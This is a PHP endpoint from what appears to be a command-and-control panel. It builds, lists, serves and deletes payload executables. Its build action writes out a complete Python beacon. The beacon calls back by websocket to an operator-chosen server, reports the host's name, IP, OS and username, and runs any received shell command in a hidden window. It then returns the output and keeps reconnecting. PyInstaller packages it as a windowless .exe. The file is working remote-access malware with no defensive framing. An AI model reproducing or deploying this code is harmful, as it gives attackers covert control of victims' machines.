<?php

require_once __DIR__ . '/../includes/auth_middleware.php';
require_once __DIR__ . '/../includes/config.php';
require_once __DIR__ . '/../includes/functions.php';

session_start();
requireAuth();

header('Content-Type: application/json');

$payloadsDir = __DIR__ . '/../data/payloads';
if (!file_exists($payloadsDir)) {
    mkdir($payloadsDir, 0755, true);
}

$jsonData = json_decode(file_get_contents('php://input'), true) ?? [];
$action = $_GET['action'] ?? $jsonData['action'] ?? '';

switch ($action) {
    case 'list':
        $payloads = [];
        foreach (glob($payloadsDir . '/*.exe') as $file) {
            $name = basename($file);
            $payloads[] = [
                'name' => $name,
                'size' => filesize($file),
                'created' => date('Y-m-d H:i:s', filemtime($file))
            ];
        }
        usort($payloads, fn($a, $b) => strtotime($b['created']) - strtotime($a['created']));
        jsonResponse(['payloads' => $payloads]);
        break;

    case 'download':
        $name = basename($_GET['name'] ?? '');
        $file = $payloadsDir . '/' . $name;
        if (file_exists($file) && pathinfo($file, PATHINFO_EXTENSION) === 'exe') {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . $name . '"');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        }
        jsonResponse(['error' => 'File not found'], 404);
        break;

    case 'delete':
        $name = basename($jsonData['name'] ?? '');
        $file = $payloadsDir . '/' . $name;
        if ($name && file_exists($file) && pathinfo($file, PATHINFO_EXTENSION) === 'exe') {
            unlink($file);
            jsonResponse(['success' => true]);
        } else {
            jsonResponse(['error' => 'File not found'], 404);
        }
        break;

    case 'build':
        $data = json_decode(file_get_contents('php://input'), true) ?? $_POST;
        $serverIp = $data['ip'] ?? '127.0.0.1';
        $serverPort = $data['port'] ?? '8080';
        $customName = preg_replace('/[^a-zA-Z0-9_-]/', '', $data['name'] ?? '');
        $beaconName = ($customName ? $customName : 'beacon_' . date('Ymd_His')) . '.exe';

        $beaconCode = <<<PYTHON
import socket
import platform
import subprocess
import threading
import time
import json
import os
import uuid

try:
    import websocket
except ImportError:
    os.system('pip install websocket-client')
    import websocket

C2_SERVER = "ws://{$serverIp}:{$serverPort}"
RECONNECT_DELAY = 5
HEARTBEAT_INTERVAL = 30

class Beacon:
    def __init__(self):
        self.agent_id = self.get_agent_id()
        self.ws = None
        self.running = True
        self.connected = False

    def get_agent_id(self):
        id_file = os.path.join(os.environ.get('TEMP', '/tmp'), '.beacon_id')
        if os.path.exists(id_file):
            with open(id_file, 'r') as f:
                return f.read().strip()
        agent_id = str(uuid.uuid4())[:8]
        try:
            with open(id_file, 'w') as f:
                f.write(agent_id)
        except:
            pass
        return agent_id

    def get_system_info(self):
        hostname = socket.gethostname()
        try:
            ip = socket.gethostbyname(hostname)
        except:
            ip = "127.0.0.1"
        return {
            "hostname": hostname,
            "ip": ip,
            "os": f"{platform.system()} {platform.release()}",
            "username": os.environ.get('USERNAME', os.environ.get('USER', 'unknown'))
        }

    def execute_command(self, command):
        try:
            if platform.system() == "Windows":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=120, startupinfo=startupinfo)
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=120)
            output = result.stdout + result.stderr
            return output.strip() if output.strip() else "[No output]"
        except subprocess.TimeoutExpired:
            return "[Command timed out]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def send(self, data):
        if self.ws and self.connected:
            try:
                self.ws.send(json.dumps(data))
            except:
                pass

    def on_message(self, ws, message):
        try:
            data = json.loads(message)
            if data.get('type') == 'execute_command':
                result = self.execute_command(data.get('command', ''))
                self.send({'type': 'command_result', 'command_id': data.get('command_id', ''), 'db_command_id': data.get('db_command_id', 0), 'result': result})
        except:
            pass

    def on_open(self, ws):
        self.connected = True
        self.send({'type': 'agent_register', 'agent_id': self.agent_id, **self.get_system_info()})
        def heartbeat():
            while self.running and self.connected:
                time.sleep(HEARTBEAT_INTERVAL)
                self.send({'type': 'agent_heartbeat', 'agent_id': self.agent_id})
        threading.Thread(target=heartbeat, daemon=True).start()

    def on_close(self, ws, close_status_code, close_msg):
        self.connected = False

    def on_error(self, ws, error):
        self.connected = False

    def connect(self):
        while self.running:
            try:
                self.ws = websocket.WebSocketApp(C2_SERVER, on_message=self.on_message, on_open=self.on_open, on_close=self.on_close, on_error=self.on_error)
                self.ws.run_forever()
            except:
                pass
            if self.running:
                time.sleep(RECONNECT_DELAY)

    def run(self):
        self.connect()

if __name__ == "__main__":
    Beacon().run()
PYTHON;

        $tempDir = sys_get_temp_dir() . '/nexus_build_' . uniqid();
        mkdir($tempDir, 0755, true);
        file_put_contents($tempDir . '/beacon.py', $beaconCode);

        $python = 'python';
        exec('where python 2>&1', $output, $code);
        if ($code !== 0) {
            exec('where python3 2>&1', $output, $code);
            $python = $code === 0 ? 'python3' : 'python';
        }

        $installCmd = "$python -m pip install pyinstaller websocket-client -q 2>&1";
        exec($installCmd);

        $buildCmd = "cd /d \"$tempDir\" && $python -m PyInstaller --onefile --noconsole --clean --name beacon beacon.py 2>&1";
        exec($buildCmd, $buildOutput, $buildCode);

        $exePath = $tempDir . '/dist/beacon.exe';
        
        if (file_exists($exePath)) {
            copy($exePath, $payloadsDir . '/' . $beaconName);
            
            array_map('unlink', glob($tempDir . '/dist/*'));
            array_map('unlink', glob($tempDir . '/build/*'));
            array_map('unlink', glob($tempDir . '/*.*'));
            @rmdir($tempDir . '/dist');
            @rmdir($tempDir . '/build');
            @rmdir($tempDir);
            
            jsonResponse([
                'success' => true,
                'name' => $beaconName,
                'message' => 'Beacon built successfully'
            ]);
        } else {
            jsonResponse([
                'error' => 'Build failed',
                'details' => implode("\n", $buildOutput)
            ], 500);
        }
        break;

    default:
        jsonResponse(['error' => 'Invalid action'], 400);
}
